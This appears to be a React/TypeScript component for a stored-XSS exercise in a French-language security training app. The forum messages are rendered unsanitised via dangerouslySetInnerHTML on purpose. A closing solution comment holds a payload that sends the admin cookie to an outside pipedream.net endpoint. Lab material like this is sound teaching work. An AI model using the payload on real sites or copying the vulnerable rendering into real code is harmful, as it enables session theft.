import React, { ChangeEvent, FormEvent, useState } from "react"
import { Button, Card, CardDescription, CardTitle, Col, TextInput } from '@dataesr/react-dsfr'
import { postMessageToForum, getMessagesFromForum } from "../../api";
import { Challenge } from "../../components";
import { storage } from "../../services";
import { useQuery } from "react-query";

export { ChallengeXSS1 }

type messageType = { author: string, value: string }

function ChallengeXSS1() {
    const [messageToPost, setMessageToPost] = useState("");
    const query = useQuery<unknown, unknown, messageType[] | null>('challengeForm1', async () => {
        const userName = storage.user.getUserName();
        if (!userName) {
            return null;
        }
        const { data } = await getMessagesFromForum(userName);
        return data
    })

    return <Challenge challengeName="challengeXSS1">
        <p>L'administrateur vient souvent se balader sur cette page. Essayez de voler son cookie la prochaine fois qu'il vient !</p>
        <form onSubmit={onSubmit}>
            <br />
            <label htmlFor="message">Message :</label><TextInput textarea id="message" name="message" value={messageToPost} onChange={onChangeMessageToPost} />
            <br />
            <br />
            <Button submit>Soumettre</Button>
        </form>
        <Col spacing="m-1h">
            {renderMessages()}

        </Col>

    </Challenge>

    function renderMessages() {
        if (query.data) {
            return query.data.map((message, index) => (
                <Card key={message.author + index}>
                    <CardTitle>
                        {message.author}
                    </CardTitle>
                    <CardDescription>
                        <p dangerouslySetInnerHTML={{ __html: message.value }} />
                    </CardDescription>
                </Card>
            ))
        } else if (query.isLoading) {
            return "Chargement..."
        }
        return "Une erreur est survenue."
    }

    function onChangeMessageToPost(e: ChangeEvent<HTMLInputElement>) {
        setMessageToPost(e.target.value);
    }

    async function onSubmit(event: FormEvent<HTMLFormElement>) {
        event.preventDefault();
        if (!messageToPost) {
            return;
        }
        const userName = storage.user.getUserName();
        const { status } = await postMessageToForum({ value: messageToPost, author: userName })
        query.refetch();
        if (status === 201) {
            setMessageToPost("")
        }
    }
}

// Solution : <iframe src="javascript:const url='https://eokmh4s8te4gein.m.pipedream.net?'+document.cookie.split(';').find(cookie => cookie.trim().startsWith('ADMIN_COOKIE')).trim('');document.write('<img src='+url+' />')" />
